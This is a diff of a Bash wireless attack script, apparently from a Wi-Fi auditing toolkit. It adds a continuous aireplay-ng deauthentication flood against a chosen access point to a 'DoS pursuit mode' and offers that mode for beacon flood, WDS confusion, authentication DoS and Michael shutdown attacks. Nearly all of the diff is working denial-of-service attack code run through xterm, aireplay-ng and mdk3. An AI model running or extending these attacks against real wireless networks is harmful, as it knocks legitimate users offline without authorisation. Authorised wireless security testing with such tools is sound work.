@@ -2748,7 +2748,11 @@ function launch_dos_pursuit_mode_attack() {
 		"mdk3 amok attack")
 			xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "${1}" -e mdk3 "${interface}" d -b "${tmpdir}bl.txt" -c "${channel}" > /dev/null 2>&1 &
 		;;
-		#TODO implement case for other DoS attacks
+		"aireplay deauth attack")
+			${airmon} start "${interface}" "${channel}" > /dev/null 2>&1
+			recalculate_windows_sizes
+			xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "${1}" -e aireplay-ng --deauth 0 -a "${bssid}" --ignore-negative-one "${interface}" > /dev/null 2>&1 &
+		;;
 	esac
 
 	dos_pursuit_mode_attack_pid=$!
@@ -2830,13 +2834,24 @@ function exec_aireplaydeauth() {
 	language_strings "${language}" 90 "title"
 	language_strings "${language}" 32 "green"
 
-	${airmon} start "${interface}" "${channel}" > /dev/null 2>&1
+	tmpfiles_toclean=1
 
 	echo
-	language_strings "${language}" 33 "yellow"
-	language_strings "${language}" 4 "read"
-	recalculate_windows_sizes
-	xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "aireplay deauth attack" -e aireplay-ng --deauth 0 -a "${bssid}" --ignore-negative-one "${interface}" > /dev/null 2>&1
+	if [ "${dos_pursuit_mode}" -eq 1 ]; then
+		language_strings "${language}" 506 "yellow"
+		language_strings "${language}" 4 "read"
+
+		dos_pursuit_mode_pids=()
+		launch_dos_pursuit_mode_attack "aireplay deauth attack" "first_time"
+		pid_control_pursuit_mode "aireplay deauth attack"
+	else
+		${airmon} start "${interface}" "${channel}" > /dev/null 2>&1
+
+		language_strings "${language}" 33 "yellow"
+		language_strings "${language}" 4 "read"
+		recalculate_windows_sizes
+		xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "aireplay deauth attack" -e aireplay-ng --deauth 0 -a "${bssid}" --ignore-negative-one "${interface}" > /dev/null 2>&1
+	fi
 }
 
 #Execute WDS confusion DoS attack
@@ -2952,6 +2967,13 @@ function aireplay_deauth_option() {
 		return
 	fi
 	ask_channel
+
+	#TODO check how to launch this avoiding airodump-ng channel hopping
+	#ask_yesno 505 "yes"
+	#if [ "${yesno}" = "y" ]; then
+	#	dos_pursuit_mode=1
+	#fi
+
 	exec_aireplaydeauth
 }
 
@@ -2975,6 +2997,12 @@ function wds_confusion_option() {
 		return
 	fi
 	ask_channel
+
+	ask_yesno 505 "yes"
+	if [ "${yesno}" = "y" ]; then
+		dos_pursuit_mode=1
+	fi
+
 	exec_wdsconfusion
 }
 
@@ -2998,6 +3026,12 @@ function beacon_flood_option() {
 		return
 	fi
 	ask_channel
+
+	ask_yesno 505 "yes"
+	if [ "${yesno}" = "y" ]; then
+		dos_pursuit_mode=1
+	fi
+
 	exec_beaconflood
 }
 
@@ -3020,6 +3054,12 @@ function auth_dos_option() {
 	if ! ask_bssid; then
 		return
 	fi
+
+	ask_yesno 505 "yes"
+	if [ "${yesno}" = "y" ]; then
+		dos_pursuit_mode=1
+	fi
+
 	exec_authdos
 }
 
@@ -3042,6 +3082,12 @@ function michael_shutdown_option() {
 	if ! ask_bssid; then
 		return
 	fi
+
+	ask_yesno 505 "yes"
+	if [ "${yesno}" = "y" ]; then
+		dos_pursuit_mode=1
+	fi
+
 	exec_michaelshutdown
 }
 
